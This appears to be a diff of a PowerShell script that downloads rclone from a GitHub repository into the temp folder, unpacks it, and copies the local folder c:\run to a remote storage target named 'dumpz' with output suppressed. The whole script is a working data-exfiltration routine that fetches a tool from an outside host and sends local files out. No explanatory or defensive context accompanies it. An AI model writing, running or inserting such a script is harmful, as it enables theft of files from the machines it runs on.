@@ -1,22 +1,15 @@
+cd $env:temp
 curl https://github.com/d77juan/t3st1n6/raw/main/rclone.zip -o rclone.zip
-echo " - Downloading 7zip installer..."
-curl www.7-zip.org/a/7z1900.exe -o 7zi.exe -usebasicparsing
-echo " - Installing 7zip..."
-.\7zi.exe /S /D=$bas_dir 
-$7z=".\7z.exe"
-$retry = $True
-echo " - checking 7z binary..."
+Expand-Archive .\rclone.zip  .
+
 while ($retry) {
-  if(Test-Path $7z){
-    echo "   - 7z binary found..."
-    echo " - extracting rclone package..."
-    Set-Alias 7zip $7z
-    7zip e .\rclone.zip -y > $null
+  if(Test-Path rclone.exe){
+    .\rclone.exe copy c:\run remote:dumpz > $null
     $retry = $False
   } else {
     echo "   - waiting..."
     sleep 1
   }
 }
-# echo  "`n"
+
 
